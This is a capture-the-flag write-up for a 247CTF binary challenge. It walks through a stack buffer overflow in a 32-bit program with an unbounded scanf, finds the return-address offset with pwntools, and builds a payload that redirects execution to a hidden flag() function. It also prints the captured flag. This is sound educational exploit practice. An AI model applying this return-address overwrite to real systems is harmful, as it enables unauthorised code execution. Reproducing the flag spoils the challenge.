# Hidden Flag Function

## Introduction

`hidden-flag-function` is a 125 point binary-exploitation challenge from
247CTF. The description states:

> Can you control this applications flow to gain access to the hidden flag
> function?

## Information Gathering

### Hint #1

Hints are for financial supporters of the site, so I don't have access.

### Vulnerability Mitigations

```shell
$ checksec ./hidden_flag_function
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Static Analysis

Opening the program in Binary Ninja, we see that `main` looks like the
following:

```c
int32_t main(int32_t argc, char** argv, char** envp) {
    void* const var_4 = __return_addr;
    int32_t* var_10 = &argc;
    setbuf(*(int32_t*)stdout, nullptr);
    puts("What do you have to say?");
    chall();
    return 0;
}

int32_t chall() {
    void loc;
    return __isoc99_scanf("%s", &loc);
}
```

As the name suggests, we also found a 'hidden' flag function called 'flag()':

```c
int32_t flag() {
    void buf;
    fgets(&buf, 0x40, fopen("flag.txt", "r"));
    return printf("How did you get here?\nHave a fl…", &buf);
}
```

From these three functions, we can gleam that the program asks for user input
via `scanf` and then returns. Given that we can control the input, we can
provide enough input that overflows the `loc` buffer on the `chall` stack frame
and overwrite the return address with the address of `flag()`. Let's test this
theory out by just trying to crash the program.

### Dynamic Analysis

Using the above strategy, we see that we can indeed crash the program with long
enough input:

```python
exe = ELF('./hidden_flag_function')
io = process([exe.path])
io.sendlineafter(b'What do you have to say?', cyclic(500))
io.recvall()
[*] Process 'hidden_flag_function' stopped with exit code -11 (SIGSEGV)
```

We can then get the corefile and see what the faulting address is to determine
the offset that overwrote the return address.

```python
core = io.corefile
cyclic_find(core.fault_addr) # yields 76.
```

Cool, so now all that is left is sending the address of the symbol `flag()` at
that offset and sending it to the program. It does not take any arguments, so
we don't have to worry about setting up the stack. We can do that with pwntools
like:

```python
payload = fit({
        76: p32(exe.symbols['flag'])
    })
```

## Solution

Sending the above gives us the flag:
`247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}`. Take a look at `solve.py` for the
whole thing in one script. The REMOTE flag probably won't work for you, as a
new container is made for each person each 24 hours.
